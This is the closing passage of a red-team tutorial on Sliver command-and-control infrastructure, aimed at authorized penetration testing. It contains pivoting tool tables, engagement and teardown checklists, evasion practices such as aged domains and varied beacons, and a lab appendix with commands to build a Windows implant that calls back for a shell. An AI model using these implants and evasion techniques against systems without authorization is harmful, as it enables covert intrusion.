| Everything else reaches Sliver through redirector | Missing UA/header/path filter — run the curl test matrix in 5.3 |
| Ligolo "operation not permitted" | Run proxy as root or grant `CAP_NET_ADMIN` |
| Ligolo connects but traffic does not flow | Tunnel not started or routes missing |
| Ligolo disconnects after routing changes | Callback route redirected into the tunnel — `ip route get <agent-ip>` and narrow the route |
| Ligolo routing loop | Add specific `/32` host routes instead of a broad subnet route |
| Proxychains slow or failing | Use `-sT` TCP connect scans, `-Pn`, start with single hosts |
| CDN-fronted C2 breaks check-ins | CDN caching beacon responses — disable caching on C2 paths |
| Agent dies after network interruption | Use `-retry`; review firewall/egress behavior |

---

## 15. Tool Comparison

| Tool | Type | Layer | Best for | Proxychains? | Speed | Extra binary on target? |
|---|---|---|---|---|---|---|
| Sliver `rportfwd` | Port forward | Application | Single services | No | High | No |
| Sliver SOCKS5 | Built-in SOCKS5 | Application | Quick proxying | Yes | High | No |
| Named-pipe pivot | SMB implant chaining | Application | Non-egress internal hosts | No | Medium | Implant only |
| Chisel | HTTP-tunneled SOCKS5 | Application | Simple proxying over HTTP | Yes | Medium | Yes |
| Ligolo-ng | TUN interface | Network | Broad subnet access | No | High | Yes |
| SSH reverse forwarding | SOCKS through SSH | Application | Existing SSH client available | Yes | Medium | No |
| Tailscale | WireGuard mesh | Network | Operator infrastructure | N/A | High | No |

---

## 16. Checklists

### Pre-engagement

- [ ] Signed written authorization and ROE reviewed by all operators
- [ ] Scope, out-of-scope systems, and test window documented
- [ ] Deconfliction contacts and emergency-stop procedure confirmed
- [ ] Infrastructure stood up and end-to-end tested (implant → CDN/redirector → team server → operator)
- [ ] Domains aged, categorized, blacklist-clean; certificates issued; caching disabled on C2 paths
- [ ] Team server firewalled: no public ports; operator access via tailnet only
- [ ] `http-c2.json` customized *before* implant generation; secret header set; versions pinned
- [ ] Artifact ledger template ready; teardown plan written

### During engagement

- [ ] Journal every action with UTC timestamps
- [ ] Ledger every artifact the moment it lands on a target
- [ ] Beacon intervals slow and varied; sessions only when needed, drop back after
- [ ] BOFs preferred; sacrificial process changed from default; LSASS access only when ROE allows
- [ ] No persistence, no out-of-scope touches, no unnecessary binaries on disk
- [ ] Monitor your redirector logs for scanning; rotate infrastructure on schedule

### Teardown

- [ ] Persistence removed and verified (per ledger)
- [ ] Uploaded binaries deleted; implants killed
- [ ] Listeners stopped; jobs killed; tunnels, routes, and TUN interfaces torn down
- [ ] In-scope hosts re-scanned to confirm cleanliness
- [ ] Evidence exported/encrypted per contract; infra destroyed; secrets and certificates rotated
- [ ] Artifact ledger walked line-by-line with the client
- [ ] Report delivered including detection gaps

---

## 17. Further Reading

- [Sliver documentation](https://sliver.sh/docs/) — including [HTTPS C2](https://sliver.sh/docs?name=HTTPS+C2) and [Pivots](https://sliver.sh/docs?name=Pivots)
- [Sliver GitHub repository and releases](https://github.com/BishopFox/sliver)
- [Sliver Armory](https://github.com/sliverarmory)
- [Chisel](https://github.com/jpillora/chisel)
- [Ligolo-ng](https://github.com/nicocha30/ligolo-ng)
- [Tailscale installation](https://tailscale.com/download)
- [OpenSSH `ssh(1)` manual](https://man7.org/linux/man-pages/man1/ssh.1.html)
- [Windows OpenSSH overview](https://learn.microsoft.com/windows-server/administration/openssh/openssh_overview)
- [Microsoft security research on Sliver](https://www.microsoft.com/en-us/security/blog/2022/08/24/looking-for-the-sliver-lining-hunting-for-emerging-command-and-control-frameworks/)
- [Sigma rule repository](https://github.com/SigmaHQ/sigma)
- [Red Fox Sec — Building C2 Infrastructure](https://www.redfoxsec.com/blog/building-command-and-control-infrastructure-a-pentesters-complete-guide)
- [Red Team Infrastructure: The Full Picture](https://0xdbgman.github.io/posts/red-team-infrastructure-the-full-picture/)
- [C2 Network Redirection & Traffic Filtering Lab (Sliver + Caddy + Cloudflare)](https://mrakashkumar.in/articles/c2-deployment/)
- [Caddy documentation](https://caddyserver.com/docs/)

---

## 18. Conclusion

This pipeline covers the authorized-assessment lifecycle end to end:

1. **Authorization and ROE** before anything technical
2. **Tailscale** for private operator access to the team server
3. **Sliver** for C2 — beacons for dwell, sessions for interactive work, stagers for constrained delivery
4. **Redirectors, aged domains, and `http-c2.json`** so the team server never touches the internet directly
5. **Implant OPSEC discipline** — BOFs, sacrificial processes, staged delivery, ledgered artifacts
6. **Ligolo-ng / Chisel / SSH / named pipes** for pivoting to match the environment
7. **Evidence, reporting, and verified teardown** — the parts that make it a professional engagement

Practice setup, validation, and teardown in an isolated lab until each component is boring. Then take the same discipline into engagements — and never operate beyond your written authorization.

---

## Appendix A: Lab Quick-Start

If the engagement-grade layers feel like too much on day one, strip them. This is the minimum, evening-sized loop — everything else in this guide is what you add when you move from lab to authorized engagements.

**What you need:** a Linux attack VM (Kali, Ubuntu, or Debian), a Windows VM you own, and both on the same host-only or NAT network.

**1. Install Sliver (Part 3):**

```bash
mkdir -p ~/tools/sliver && cd ~/tools/sliver
# Check https://github.com/BishopFox/sliver/releases for the current tag
wget -q https://github.com/BishopFox/sliver/releases/download/v1.7.3/sliver-server_linux -O sliver-server
chmod +x sliver-server && ./sliver-server
```

**2. Start an mTLS listener and build a session implant (mTLS is fine in a lab — Part 4):**

```sliver
mtls --lhost 0.0.0.0 --lport 8888
generate --mtls <attack-vm-ip>:8888 --os windows --arch amd64 --save /tmp/implant.exe
```

**3.** Move `/tmp/implant.exe` to your Windows VM, execute it, then in Sliver: `sessions` → `use <id>` → `shell`.

**4. Quick proxying (Part 7):**

```sliver
socks5 start -P 1080
```

```bash
proxychains4 nmap -sT -Pn -p 445,3389 <target-ip>
```

**5.** Add a second, isolated network adapter to the Windows VM (an internal subnet like `10.10.20.0/24`) and practice Ligolo-ng end to end (Part 9) — including reproducing and then avoiding the routing-loop warning. That one exercise teaches more about pivoting than a week of reading.

**6.** Practice teardown until it's muscle memory: `kill` the session, `jobs` → `kill <job-id>`, remove the TUN interface and routes, delete the implant from the VM.

When this loop is boring, add the professional layers in order: multiplayer and operator configs (Part 3) → redirectors, domains, and `http-c2.json` (Part 5) → implant OPSEC (Part 6) → evidence and ledgering (Part 11). At that point you are practicing engagements, not labs.

---

**Disclaimer:** This guide is for educational and authorized security testing purposes only. Always obtain proper written permission before testing any system. Infrastructure and operational techniques described here are intended for environments you own or are contractually authorized to test, and should be paired with detection-validation deliverables that improve the client's defenses.
